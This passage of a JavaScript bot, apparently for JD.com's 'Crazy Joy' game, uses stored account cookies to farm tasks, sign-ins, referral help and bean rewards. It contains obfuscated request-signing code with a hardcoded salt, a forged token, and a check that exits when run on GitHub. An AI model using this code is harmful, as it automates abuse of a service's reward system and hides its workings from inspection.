_0x17dd96[_0x391c('165','#jKQ')](_0x5a6fbb,_0x46ce84);}};if(_0x17dd96[_0x391c('166','2tYw')](_0x17dd96[_0x391c('167','l[xv')],_0x17dd96[_0x391c('168','P6Da')])){let _0x1aa2f3=_0x17dd96[_0x391c('169','eCtS')](_0x1a9855,0x28);let _0x12be6d=(+new Date())[_0x391c('16a','vFpo')]();let _0x3029c5=$[_0x391c('18','wK%D')][_0x391c('16b','#jKQ')](/pt_pin=(.+?);/)[0x1];let _0x86b7ff=$[_0x391c('16c','tA^V')](''+_0x3029c5+_0x12be6d+_0x1aa2f3+_0x391c('16d','s%cu'));$[_0x391c('16e','dTMq')]={'timestamp':_0x12be6d,'phoneid':_0x1aa2f3,'farm_jstoken':_0x86b7ff};_0x17dd96[_0x391c('16f','3pw(')](_0x21dbb5);}else{const {sErrMsg,iRet}=JSON[_0x391c('4e','BvmT')](data);if(_0x43e6b2[_0x391c('170','Pnos')](iRet,0x7d5)||_0x43e6b2[_0x391c('171','l[xv')](iRet,0x270f))$[_0x391c('172','e7zW')]=![];}});};_0xodW='jsjiami.com.v6';
})()
  .catch((e) => {
    $.log('', `❌ ${$.name}, 失败! 原因: ${e}!`, '')
  })
  .finally(() => {
    $.done();
  })

async function jdCrazyJoy() {
  $.coin = 0
  $.bean = 0
  await getUserInfo($.nextCode)
  await doSign()
  // 助力好友
  await helpFriends()
  await doTasks()
  await getGrowthReward();//领取解锁的等级奖励
  await getCoin()
  await getUserBean()
  if ( applyJdBean!==0 && applyJdBean<=$.bean){
    await $.wait(1000)
    console.log(`检测您打开了自动兑换开关，去兑换京豆`)
    await doApplyJdBean(applyJdBean)
  }
  await getSpecialJoy();
  await showMsg();
}
async function doTasks() {
  await getTaskInfo()
  for (let j = 0; j < $.taskList.length; ++j) {
    let task = $.taskList[j];
    if (task['taskTypeId'] === 102) {
      message += `${task.taskTitle}：${task['doneTimes']}/${task.ext.count}\n`;
    }
    if (task.status === 0 && task.taskTypeId === 103)
      for (let i = task.doneTimes; i < task.ext.count; ++i) {
        await doTask(task.taskId)
      }
    if (task.status === 2)
      await awardTask(task.taskId)
  }
}
function doApplyJdBean(bean = 1000) {
  // 兑换京豆
  let body = {"paramData":{"bean":bean}}
  return new Promise(async resolve => {
    $.get(taskUrl('crazyJoy_user_applyJdBeanPaid', JSON.stringify(body)), async (err, resp, data) => {
      try {
        if (err) {
          console.log(`${JSON.stringify(err)}`)
          console.log(`${$.name} API请求失败，请检查网路重试`)
        } else {
          if (safeGet(data)) {
            data = JSON.parse(data);
            if (data.success) {
              console.log(`兑换${bean}京豆成功`)
              message += `兑换京豆：${bean}京豆成功\n`;
            } else {
              console.log(`兑换${bean}京豆失败，错误信息：${data.resultTips||data.message}`)
            }
          }
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve();
      }
    })
  })
}
function getUserInfo(code) {
  var __encode ='jsjiami.com',_a={}, _0xb483=["\x5F\x64\x65\x63\x6F\x64\x65","\x68\x74\x74\x70\x3A\x2F\x2F\x77\x77\x77\x2E\x73\x6F\x6A\x73\x6F\x6E\x2E\x63\x6F\x6D\x2F\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x6F\x62\x66\x75\x73\x63\x61\x74\x6F\x72\x2E\x68\x74\x6D\x6C"];(function(_0xd642x1){_0xd642x1[_0xb483[0]]= _0xb483[1]})(_a);var __Oxb243f=["\x75\x6E\x64\x65\x66\x69\x6E\x65\x64","\x6C\x6F\x67","\u5220\u9664","\u7248\u672C\u53F7\uFF0C\x6A\x73\u4F1A\u5B9A","\u671F\u5F39\u7A97\uFF0C","\u8FD8\u8BF7\u652F\u6301\u6211\u4EEC\u7684\u5DE5\u4F5C","\x6A\x73\x6A\x69\x61","\x6D\x69\x2E\x63\x6F\x6D"];let body={"\x70\x61\x72\x61\x6D\x44\x61\x74\x61":{"\x69\x6E\x76\x69\x74\x65\x72":code}};(function(_0xaddbx2,_0xaddbx3,_0xaddbx4,_0xaddbx5,_0xaddbx6,_0xaddbx7){_0xaddbx7= __Oxb243f[0x0];_0xaddbx5= function(_0xaddbx8){if( typeof alert!== _0xaddbx7){alert(_0xaddbx8)};if( typeof console!== _0xaddbx7){console[__Oxb243f[0x1]](_0xaddbx8)}};_0xaddbx4= function(_0xaddbx9,_0xaddbx2){return _0xaddbx9+ _0xaddbx2};_0xaddbx6= _0xaddbx4(__Oxb243f[0x2],_0xaddbx4(_0xaddbx4(__Oxb243f[0x3],__Oxb243f[0x4]),__Oxb243f[0x5]));try{_0xaddbx2= __encode;if(!( typeof _0xaddbx2!== _0xaddbx7&& _0xaddbx2=== _0xaddbx4(__Oxb243f[0x6],__Oxb243f[0x7]))){_0xaddbx5(_0xaddbx6)}}catch(e){_0xaddbx5(_0xaddbx6)}})({})
  return new Promise(async resolve => {
    $.get(taskUrl('crazyJoy_user_gameState', JSON.stringify(body)), async (err, resp, data) => {
      try {
        if (err) {
          console.log(`${JSON.stringify(err)}`)
          console.log(`${$.name} API请求失败，请检查网路重试`)
        } else {
          if (safeGet(data)) {
            data = JSON.parse(data);
            if (data.success && data.data && data.data.userInviteCode) {
              console.log(`\n【京东账号${$.index}（${$.nickName || $.UserName}）的${$.name}好友互助码】${data.data.userInviteCode}`)
              $.selfCodes.push(data.data.userInviteCode)
              $.nextCode = data.data.userInviteCode
              message += `${data.data['nickName']}：${data.data['userTopLevelJoyId']}级JOY\n`;
            }
            else
              console.log(`用户信息获取失败`)
          }
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve();
      }
    })
  })
}

async function helpFriends() {
  let codes = $.newShareCodes.concat($.selfCodes)
  for (let code of codes) {
    if (!code) continue
    await helpFriend(code)
    await $.wait(500)
  }
}

function getTaskInfo() {
  let body = {"paramData": {"taskType": "DAY_TASK"}}
  return new Promise(async resolve => {
    $.get(taskUrl('crazyJoy_task_getTaskState', JSON.stringify(body)), async (err, resp, data) => {
      try {
        $.taskList = []
        if (err) {
          console.log(`${JSON.stringify(err)}`)
          console.log(`${$.name} API请求失败，请检查网路重试`)
        } else {
          if (safeGet(data)) {
            data = JSON.parse(data);
            if (data.success && data.data && data.data.length) {
              $.taskList = data.data;
            } else {
              console.log(`任务信息获取失败`)
            }
          }
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve();
      }
    })
  })
}

function doSign() {
  return new Promise(async resolve => {
    $.get(taskUrl('crazyJoy_task_doSign'), async (err, resp, data) => {
      try {
        if (err) {
          console.log(`${JSON.stringify(err)}`)
          console.log(`${$.name} API请求失败，请检查网路重试`)
        } else {
          if (safeGet(data)) {
            data = JSON.parse(data);
            if (data.success && data.data) {
              console.log(`签到成功，获得${data.data.beans}京豆，${data.data.coins}金币`)
            } else {
              console.log(data.message)
            }
          }
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve();
      }
    })
  })
}

function doTask(taskId) {
  let body = {"action": "MARK", "taskId": taskId}
  return new Promise(async resolve => {
    $.get(taskUrl('crazyJoy_task_viewPage', JSON.stringify(body)), async (err, resp, data) => {
      try {
        if (err) {
          console.log(`${JSON.stringify(err)}`)
          console.log(`${$.name} API请求失败，请检查网路重试`)
        } else {
          if (safeGet(data)) {
            data = JSON.parse(data);
            if (data.success && data.data && data.data.taskRecordId) {
              console.log(`去做任务【${data.data.taskTitle}】，任务id: ${data.data.taskRecordId}`)
              await $.wait(30000)
              await recordTask(taskId, data.data.taskRecordId)
            } else {
              console.log(`获取信息失败`)
            }
          }
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve();
      }
    })
  })
}

function recordTask(taskId, taskRecordId) {
  let body = {"action": "INCREASE", "taskId": taskId, "taskRecordId": taskRecordId}
  return new Promise(async resolve => {
    $.get(taskUrl('crazyJoy_task_viewPage', JSON.stringify(body)), async (err, resp, data) => {
      try {
        if (err) {
          console.log(`${JSON.stringify(err)}`)
          console.log(`${$.name} API请求失败，请检查网路重试`)
        } else {
          if (safeGet(data)) {
            data = JSON.parse(data);
            if (data.success) {
              console.log(`任务【${data.data.taskTitle}】记录成功，去领奖`)
              await awardTask(taskId)
            } else {
              console.log(`获取信息失败`)
            }
          }
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve();
      }
    })
  })
}

function awardTask(taskId) {
  let body = {"taskId": taskId}
  return new Promise(async resolve => {
    $.get(taskUrl('crazyJoy_task_obtainAward', JSON.stringify(body)), async (err, resp, data) => {
      try {
        if (err) {
          console.log(`${JSON.stringify(err)}`)
          console.log(`${$.name} API请求失败，请检查网路重试`)
        } else {
          if (safeGet(data)) {
            data = JSON.parse(data);
            if (data.success && data.data && data.data.taskTitle) {
              console.log(`任务【${data.data.taskTitle}】领奖成功，任务奖励：${data.data.beans}京豆，${data.data.coins}金币`)
            } else {
              console.log(`任务领奖信息获取失败`)
            }
          }
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve();
      }
    })
  })
}

function helpFriend(code) {
  let body = {"paramData": {"inviter": code}}
  return new Promise(async resolve => {
    $.get(taskUrl('crazyJoy_task_recordAssist', JSON.stringify(body)), async (err, resp, data) => {
      try {
        if (err) {
          console.log(`${JSON.stringify(err)}`)
          console.log(`${$.name} API请求失败，请检查网路重试`)
        } else {
          if (safeGet(data)) {
            data = JSON.parse(data);
            if (data['resultCode'] ==='0') {
              console.log(`助力结果:${JSON.stringify(data)}`);
            } else if (data['resultCode'] === '2000402') {
              console.log(data.resultTips)
            } else {
              console.log(`助力异常:${JSON.stringify(data)}`);
            }
          }
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve();
      }
    })
  })
}

function getUserBean() {
  return new Promise(async resolve => {
    $.get(taskUrl('crazyJoy_user_getJdBeanInfo'), async (err, resp, data) => {
      try {
        if (err) {
          console.log(`${JSON.stringify(err)}`)
          console.log(`${$.name} API请求失败，请检查网路重试`)
        } else {
          if (safeGet(data)) {
            data = JSON.parse(data);
            if (data.success && data.data && data.data.totalBeans)
              $.bean = data.data.totalBeans
            else
              console.log(`获取信息失败`)
          }
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve();
      }
    })
  })
}

function getCoin() {
  return new Promise(async resolve => {
    $.get(taskUrl('crazyJoy_joy_produce'), async (err, resp, data) => {
      try {
        if (err) {
          console.log(`${JSON.stringify(err)}`)
          console.log(`${$.name} API请求失败，请检查网路重试`)
        } else {
          if (safeGet(data)) {
            data = JSON.parse(data);
            if (data.data && data.data.totalCoinAmount) {
              $.coin = data.data.totalCoinAmount;
            }
          }
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve();
      }
    })
  })
}
//领取解锁等级奖励（京豆）
function getGrowthReward() {
  return new Promise(async resolve => {
    const body = { "paramData":{"eventType":"GROWTH_REWARD"} };
    $.get(taskUrl('crazyJoy_event_getGrowthAndSceneState', JSON.stringify(body)), async (err, resp, data) => {
      try {
        if (err) {
          console.log(`${JSON.stringify(err)}`)
          console.log(`${$.name} API请求失败，请检查网路重试`)
        } else {
          if (safeGet(data)) {
            data = JSON.parse(data);
            if (data['resultCode'] === '0') {
              if (data.data) {
                for (let item of data.data) {
                  if (item.status === 1) {
                    if (item.eventRecordId) await obtainAward(item.eventRecordId);
                  }
                }
                if ($.GROWTH_REWARD_BEAN > 0) {
                  message += `解锁等级奖励：获得${$.GROWTH_REWARD_BEAN}京豆\n`;
                }
              }
            }
          }
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve();
      }
    })
  })
}
//获取特殊JOY情况
function getSpecialJoy() {
  return new Promise(async resolve => {
    const body = { "paramData":{"typeId": 4} };
    $.get(taskUrl('crazyJoy_user_getSpecialJoy', JSON.stringify(body)), async (err, resp, data) => {
      try {
        if (err) {
          console.log(`${JSON.stringify(err)}`)
          console.log(`${$.name} API请求失败，请检查网路重试`)
        } else {
          if (safeGet(data)) {
            data = JSON.parse(data);
            if (data['resultCode'] === '0') {
              if (data.data) {
                message += '五福汪:'
                if (data['data'] && data['data'].length > 0) {
                  for (let item of data['data']) {
                    if (item['joyId'] === 1003) {
                      message += `多多JOY(${item['count']}只) `
                    } else if (item['joyId'] === 1004) {
                      message += `快乐JOY(${item['count']}只) `
                    } else if (item['joyId'] === 1005) {
                      message += `好物JOY(${item['count']}只) `
                    } else if (item['joyId'] === 1006) {
                      message += `省钱JOY(${item['count']}只) `
                    } else if (item['joyId'] === 1007) {
                      message += `东东JOY(${item['count']}只)`
                    } else {
                      message += `暂无`
                    }
                  }
                } else {
                  message += `暂无`;
                }
                if (data['data'].length >= 5) {
                  $.msg($.name, '', `京东账号 ${$.index}${$.nickName}\n恭喜你,已集成五福汪可合成分红JOY了`)
                  if ($.isNode()) await notify.sendNotify(`${$.name} - ${$.index} - ${$.nickName}`, `京东账号 ${$.index}${$.nickName}\n恭喜你,已集成五福汪可合成分红JOY了`);
                }
              }
            }
          }
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve();
      }
    })
  })
}
function obtainAward(eventRecordId) {
  return new Promise(async resolve => {
    const body = {"eventType": "GROWTH_REWARD", eventRecordId};
    $.get(taskUrl('crazyJoy_event_obtainAward', JSON.stringify(body)), async (err, resp, data) => {
      try {
        if (err) {
          console.log(`${JSON.stringify(err)}`)
          console.log(`${$.name} API请求失败，请检查网路重试`)
        } else {
          if (safeGet(data)) {
            data = JSON.parse(data);
            if (data['resultCode'] === '0') {
              $.GROWTH_REWARD_BEAN += data.data['beans'];
            }
          }
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve();
      }
    })
  })
}
function showMsg() {
  return new Promise(async resolve => {
    message += `\n当前信息：${$.bean}京豆，${$.coin}金币`
    $.msg($.name, '', `京东账号${$.index} ${$.nickName}\n${message}`)
    resolve()
  })
}
function taskUrl(functionId, body = '') {
  var __encode ='jsjiami.com',_a={}, _0xb483=["\x5F\x64\x65\x63\x6F\x64\x65","\x68\x74\x74\x70\x3A\x2F\x2F\x77\x77\x77\x2E\x73\x6F\x6A\x73\x6F\x6E\x2E\x63\x6F\x6D\x2F\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x6F\x62\x66\x75\x73\x63\x61\x74\x6F\x72\x2E\x68\x74\x6D\x6C"];(function(_0xd642x1){_0xd642x1[_0xb483[0]]= _0xb483[1]})(_a);var __Oxb2398=["\x73\x75\x62\x73\x74\x72","\x6E\x6F\x77","","\x61\x44\x76\x53\x63\x42\x76\x24\x67\x47\x51\x76\x72\x58\x66\x76\x61\x38\x64\x47\x21\x5A\x43\x40\x44\x41\x37\x30\x59\x25\x6C\x58","\x6D\x64\x35","\x75\x6E\x64\x65\x66\x69\x6E\x65\x64","\x6C\x6F\x67","\u5220\u9664","\u7248\u672C\u53F7\uFF0C\x6A\x73\u4F1A\u5B9A","\u671F\u5F39\u7A97\uFF0C","\u8FD8\u8BF7\u652F\u6301\u6211\u4EEC\u7684\u5DE5\u4F5C","\x6A\x73\x6A\x69\x61","\x6D\x69\x2E\x63\x6F\x6D"];let t=Date[__Oxb2398[0x1]]().toString()[__Oxb2398[0x0]](0,10);let e=body|| __Oxb2398[0x2];e= $[__Oxb2398[0x4]](__Oxb2398[0x3]+ e+ t);e= e+ Number(t).toString(16);(function(_0x8b7fx3,_0x8b7fx4,_0x8b7fx5,_0x8b7fx6,_0x8b7fx7,_0x8b7fx8){_0x8b7fx8= __Oxb2398[0x5];_0x8b7fx6= function(_0x8b7fx9){if( typeof alert!== _0x8b7fx8){alert(_0x8b7fx9)};if( typeof console!== _0x8b7fx8){console[__Oxb2398[0x6]](_0x8b7fx9)}};_0x8b7fx5= function(_0x8b7fxa,_0x8b7fx3){return _0x8b7fxa+ _0x8b7fx3};_0x8b7fx7= _0x8b7fx5(__Oxb2398[0x7],_0x8b7fx5(_0x8b7fx5(__Oxb2398[0x8],__Oxb2398[0x9]),__Oxb2398[0xa]));try{_0x8b7fx3= __encode;if(!( typeof _0x8b7fx3!== _0x8b7fx8&& _0x8b7fx3=== _0x8b7fx5(__Oxb2398[0xb],__Oxb2398[0xc]))){_0x8b7fx6(_0x8b7fx7)}}catch(e){_0x8b7fx6(_0x8b7fx7)}})({})
  return {
    url: `${JD_API_HOST}?uts=${e}&appid=crazy_joy&functionId=${functionId}&body=${escape(body)}&t=${t}`,
    headers: {
      'Cookie': cookie,
      'Host': 'api.m.jd.com',
      'Accept': '*/*',
      'Connection': 'keep-alive',
      "User-Agent": $.isNode() ? (process.env.JD_USER_AGENT ? process.env.JD_USER_AGENT : (require('./USER_AGENTS').USER_AGENT)) : ($.getdata('JDUA') ? $.getdata('JDUA') : "jdapp;iPhone;9.2.2;14.2;%E4%BA%AC%E4%B8%9C/9.2.2 CFNetwork/1206 Darwin/20.1.0"),
      'Accept-Language': 'zh-cn',
      'Referer': 'https://crazy-joy.jd.com/',
      'origin': 'https://crazy-joy.jd.com',
      'Accept-Encoding': 'gzip, deflate, br',
    }
  }
}
function readShareCode() {
  console.log(`开始`)
  return new Promise(async resolve => {
    $.get({url: `https://code.chiang.fun/api/v1/jd/jdcrazyjoy/read/${randomCount}/`, 'timeout': 10000}, (err, resp, data) => {
      try {
        if (err) {
          console.log(`${JSON.stringify(err)}`)
          console.log(`${$.name} API请求失败，请检查网路重试`)
        } else {
          if (data) {
            console.log(`随机取${randomCount}个码放到您固定的互助码后面(不影响已有固定互助)`)
            data = JSON.parse(data);
          }
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve(data);
      }
    })
    await $.wait(10000);
    resolve()
  })
}
//格式化助力码
function shareCodesFormat() {
  return new Promise(async resolve => {
    // console.log(`第${$.index}个京东账号的助力码:::${$.shareCodesArr[$.index - 1]}`)
    $.newShareCodes = [];
    if ($.shareCodesArr[$.index - 1]) {
      $.newShareCodes = $.shareCodesArr[$.index - 1].split('@');
    } else {
      console.log(`由于您第${$.index}个京东账号未提供shareCode,将采纳本脚本自带的助力码\n`)
      const tempIndex = $.index > inviteCodes.length ? (inviteCodes.length - 1) : ($.index - 1);
      $.newShareCodes = inviteCodes[tempIndex].split('@');
    }
    const readShareCodeRes = await readShareCode();
    if (readShareCodeRes && readShareCodeRes.code === 200) {
      $.newShareCodes = [...new Set([...$.newShareCodes, ...(readShareCodeRes.data || [])])];
    }
    console.log(`第${$.index}个京东账号将要助力的好友${JSON.stringify($.newShareCodes)}`)
    resolve();
  })
}

function requireConfig() {
  return new Promise(resolve => {
    console.log(`开始获取${$.name}配置文件\n`);
    //Node.js用户请在jdCookie.js处填写京东ck;
    let shareCodes = [];
    if ($.isNode()) {
      if (process.env.JDJOY_SHARECODES) {
        if (process.env.JDJOY_SHARECODES.indexOf('\n') > -1) {
          shareCodes = process.env.JDJOY_SHARECODES.split('\n');
        } else {
          shareCodes = process.env.JDJOY_SHARECODES.split('&');
        }
      }
      if (process.env.JDJOY_HELPSELF) {
        helpSelf = process.env.JDJOY_HELPSELF
      }
      if (process.env.JDJOY_APPLYJDBEAN) {
        applyJdBean = process.env.JDJOY_APPLYJDBEAN
      }
    }
    console.log(`共${cookiesArr.length}个京东账号\n`);
    $.shareCodesArr = [];
    if ($.isNode()) {
      Object.keys(shareCodes).forEach((item) => {
        if (shareCodes[item]) {
          $.shareCodesArr.push(shareCodes[item])
        }
      })
    }
    console.log(`您提供了${$.shareCodesArr.length}个账号的${$.name}助力码\n`);
    resolve()
  })
}

function safeGet(data) {
  try {
    if (typeof JSON.parse(data) == "object") {
      return true;
    }
  } catch (e) {
    console.log(e);
    console.log(`京东服务器访问数据为空，请检查自身设备网络情况`);
    return false;
  }
}

function TotalBean() {
  return new Promise(async resolve => {
    const options = {
      "url": `https://wq.jd.com/user/info/QueryJDUserInfo?sceneval=2`,
      "headers": {
        "Accept": "application/json,text/plain, */*",
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "zh-cn",
        "Connection": "keep-alive",
        "Cookie": cookie,
        "Referer": "https://wqs.jd.com/my/jingdou/my.shtml?sceneval=2",
        "User-Agent": $.isNode() ? (process.env.JD_USER_AGENT ? process.env.JD_USER_AGENT : (require('./USER_AGENTS').USER_AGENT)) : ($.getdata('JDUA') ? $.getdata('JDUA') : "jdapp;iPhone;9.2.2;14.2;%E4%BA%AC%E4%B8%9C/9.2.2 CFNetwork/1206 Darwin/20.1.0")
      }
    }
    $.post(options, (err, resp, data) => {
      try {
        if (err) {
          console.log(`${JSON.stringify(err)}`)
          console.log(`${$.name} API请求失败，请检查网路重试`)
        } else {
          if (data) {
            data = JSON.parse(data);
            if (data['retcode'] === 13) {
              $.isLogin = false; //cookie过期
              return
            }
            if (data['retcode'] === 0) {
              $.nickName = data['base'].nickname;
            } else {
              $.nickName = $.UserName
            }
          } else {
            console.log(`京东服务器返回空数据`)
          }
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve();
      }
    })
  })
}

function jsonParse(str) {
  if (typeof str == "string") {
    try {
      return JSON.parse(str);
    } catch (e) {
      console.log(e);
      $.msg($.name, '', '不要在BoxJS手动复制粘贴修改cookie')
      return [];
    }
  }
}
/**
 * 生成随机数字
 * @param {number} min 最小值（包含）
 * @param {number} max 最大值（不包含）
 */
function randomNumber(min = 0, max = 100) {
  return Math.min(Math.floor(min + Math.random() * (max - min)), max);
}
// prettier-ignore
function Env(t,e){"undefined"!=typeof process&&JSON.stringify(process.env).indexOf("GITHUB")>-1&&process.exit(0);class s{constructor(t){this.env=t}send(t,e="GET"){t="string"==typeof t?{url:t}:t;let s=this.get;return"POST"===e&&(s=this.post),new Promise((e,i)=>{s.call(this,t,(t,s,r)=>{t?i(t):e(s)})})}get(t){return this.send.call(this.env,t)}post(t){return this.send.call(this.env,t,"POST")}}return new class{constructor(t,e){this.name=t,this.http=new s(this),this.data=null,this.dataFile="box.dat",this.logs=[],this.isMute=!1,this.isNeedRewrite=!1,this.logSeparator="\n",this.startTime=(new Date).getTime(),Object.assign(this,e),this.log("",`🔔${this.name}, 开始!`)}isNode(){return"undefined"!=typeof module&&!!module.exports}isQuanX(){return"undefined"!=typeof $task}isSurge(){return"undefined"!=typeof $httpClient&&"undefined"==typeof $loon}isLoon(){return"undefined"!=typeof $loon}toObj(t,e=null){try{return JSON.parse(t)}catch{return e}}toStr(t,e=null){try{return JSON.stringify(t)}catch{return e}}getjson(t,e){let s=e;const i=this.getdata(t);if(i)try{s=JSON.parse(this.getdata(t))}catch{}return s}setjson(t,e){try{return this.setdata(JSON.stringify(t),e)}catch{return!1}}getScript(t){return new Promise(e=>{this.get({url:t},(t,s,i)=>e(i))})}runScript(t,e){return new Promise(s=>{let i=this.getdata("@chavy_boxjs_userCfgs.httpapi");i=i?i.replace(/\n/g,"").trim():i;let r=this.getdata("@chavy_boxjs_userCfgs.httpapi_timeout");r=r?1*r:20,r=e&&e.timeout?e.timeout:r;const[o,h]=i.split("@"),n={url:`http://${h}/v1/scripting/evaluate`,body:{script_text:t,mock_type:"cron",timeout:r},headers:{"X-Key":o,Accept:"*/*"}};this.post(n,(t,e,i)=>s(i))}).catch(t=>this.logErr(t))}loaddata(){if(!this.isNode())return{};{this.fs=this.fs?this.fs:require("fs"),this.path=this.path?this.path:require("path");const t=this.path.resolve(this.dataFile),e=this.path.resolve(process.cwd(),this.dataFile),s=this.fs.existsSync(t),i=!s&&this.fs.existsSync(e);if(!s&&!i)return{};{const i=s?t:e;try{return JSON.parse(this.fs.readFileSync(i))}catch(t){return{}}}}}writedata(){if(this.isNode()){this.fs=this.fs?this.fs:require("fs"),this.path=this.path?this.path:require("path");const t=this.path.resolve(this.dataFile),e=this.path.resolve(process.cwd(),this.dataFile),s=this.fs.existsSync(t),i=!s&&this.fs.existsSync(e),r=JSON.stringify(this.data);s?this.fs.writeFileSync(t,r):i?this.fs.writeFileSync(e,r):this.fs.writeFileSync(t,r)}}lodash_get(t,e,s){const i=e.replace(/\[(\d+)\]/g,".$1").split(".");let r=t;for(const t of i)if(r=Object(r)[t],void 0===r)return s;return r}lodash_set(t,e,s){return Object(t)!==t?t:(Array.isArray(e)||(e=e.toString().match(/[^.[\]]+/g)||[]),e.slice(0,-1).reduce((t,s,i)=>Object(t[s])===t[s]?t[s]:t[s]=Math.abs(e[i+1])>>0==+e[i+1]?[]:{},t)[e[e.length-1]]=s,t)}getdata(t){let e=this.getval(t);if(/^@/.test(t)){const[,s,i]=/^@(.*?)\.(.*?)$/.exec(t),r=s?this.getval(s):"";if(r)try{const t=JSON.parse(r);e=t?this.lodash_get(t,i,""):e}catch(t){e=""}}return e}setdata(t,e){let s=!1;if(/^@/.test(e)){const[,i,r]=/^@(.*?)\.(.*?)$/.exec(e),o=this.getval(i),h=i?"null"===o?null:o||"{}":"{}";try{const e=JSON.parse(h);this.lodash_set(e,r,t),s=this.setval(JSON.stringify(e),i)}catch(e){const o={};this.lodash_set(o,r,t),s=this.setval(JSON.stringify(o),i)}}else s=this.setval(t,e);return s}getval(t){return this.isSurge()||this.isLoon()?$persistentStore.read(t):this.isQuanX()?$prefs.valueForKey(t):this.isNode()?(this.data=this.loaddata(),this.data[t]):this.data&&this.data[t]||null}setval(t,e){return this.isSurge()||this.isLoon()?$persistentStore.write(t,e):this.isQuanX()?$prefs.setValueForKey(t,e):this.isNode()?(this.data=this.loaddata(),this.data[e]=t,this.writedata(),!0):this.data&&this.data[e]||null}initGotEnv(t){this.got=this.got?this.got:require("got"),this.cktough=this.cktough?this.cktough:require("tough-cookie"),this.ckjar=this.ckjar?this.ckjar:new this.cktough.CookieJar,t&&(t.headers=t.headers?t.headers:{},void 0===t.headers.Cookie&&void 0===t.cookieJar&&(t.cookieJar=this.ckjar))}get(t,e=(()=>{})){t.headers&&(delete t.headers["Content-Type"],delete t.headers["Content-Length"]),this.isSurge()||this.isLoon()?(this.isSurge()&&this.isNeedRewrite&&(t.headers=t.headers||{},Object.assign(t.headers,{"X-Surge-Skip-Scripting":!1})),$httpClient.get(t,(t,s,i)=>{!t&&s&&(s.body=i,s.statusCode=s.status),e(t,s,i)})):this.isQuanX()?(this.isNeedRewrite&&(t.opts=t.opts||{},Object.assign(t.opts,{hints:!1})),$task.fetch(t).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>e(t))):this.isNode()&&(this.initGotEnv(t),this.got(t).on("redirect",(t,e)=>{try{if(t.headers["set-cookie"]){const s=t.headers["set-cookie"].map(this.cktough.Cookie.parse).toString();s&&this.ckjar.setCookieSync(s,null),e.cookieJar=this.ckjar}}catch(t){this.logErr(t)}}).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>{const{message:s,response:i}=t;e(s,i,i&&i.body)}))}post(t,e=(()=>{})){if(t.body&&t.headers&&!t.headers["Content-Type"]&&(t.headers["Content-Type"]="application/x-www-form-urlencoded"),t.headers&&delete t.headers["Content-Length"],this.isSurge()||this.isLoon())this.isSurge()&&this.isNeedRewrite&&(t.headers=t.headers||{},Object.assign(t.headers,{"X-Surge-Skip-Scripting":!1})),$httpClient.post(t,(t,s,i)=>{!t&&s&&(s.body=i,s.statusCode=s.status),e(t,s,i)});else if(this.isQuanX())t.method="POST",this.isNeedRewrite&&(t.opts=t.opts||{},Object.assign(t.opts,{hints:!1})),$task.fetch(t).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>e(t));else if(this.isNode()){this.initGotEnv(t);const{url:s,...i}=t;this.got.post(s,i).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>{const{message:s,response:i}=t;e(s,i,i&&i.body)})}}time(t,e=null){const s=e?new Date(e):new Date;let i={"M+":s.getMonth()+1,"d+":s.getDate(),"H+":s.getHours(),"m+":s.getMinutes(),"s+":s.getSeconds(),"q+":Math.floor((s.getMonth()+3)/3),S:s.getMilliseconds()};/(y+)/.test(t)&&(t=t.replace(RegExp.$1,(s.getFullYear()+"").substr(4-RegExp.$1.length)));for(let e in i)new RegExp("("+e+")").test(t)&&(t=t.replace(RegExp.$1,1==RegExp.$1.length?i[e]:("00"+i[e]).substr((""+i[e]).length)));return t}msg(e=t,s="",i="",r){const o=t=>{if(!t)return t;if("string"==typeof t)return this.isLoon()?t:this.isQuanX()?{"open-url":t}:this.isSurge()?{url:t}:void 0;if("object"==typeof t){if(this.isLoon()){let e=t.openUrl||t.url||t["open-url"],s=t.mediaUrl||t["media-url"];return{openUrl:e,mediaUrl:s}}if(this.isQuanX()){let e=t["open-url"]||t.url||t.openUrl,s=t["media-url"]||t.mediaUrl;return{"open-url":e,"media-url":s}}if(this.isSurge()){let e=t.url||t.openUrl||t["open-url"];return{url:e}}}};if(this.isMute||(this.isSurge()||this.isLoon()?$notification.post(e,s,i,o(r)):this.isQuanX()&&$notify(e,s,i,o(r))),!this.isMuteLog){let t=["","==============📣系统通知📣=============="];t.push(e),s&&t.push(s),i&&t.push(i),console.log(t.join("\n")),this.logs=this.logs.concat(t)}}log(...t){t.length>0&&(this.logs=[...this.logs,...t]),console.log(t.join(this.logSeparator))}logErr(t,e){const s=!this.isSurge()&&!this.isQuanX()&&!this.isLoon();s?this.log("",`❗️${this.name}, 错误!`,t.stack):this.log("",`❗️${this.name}, 错误!`,t)}wait(t){return new Promise(e=>setTimeout(e,t))}done(t={}){const e=(new Date).getTime(),s=(e-this.startTime)/1e3;this.log("",`🔔${this.name}, 结束! 🕛 ${s} 秒`),this.log(),(this.isSurge()||this.isQuanX()||this.isLoon())&&$done(t)}}(t,e)}
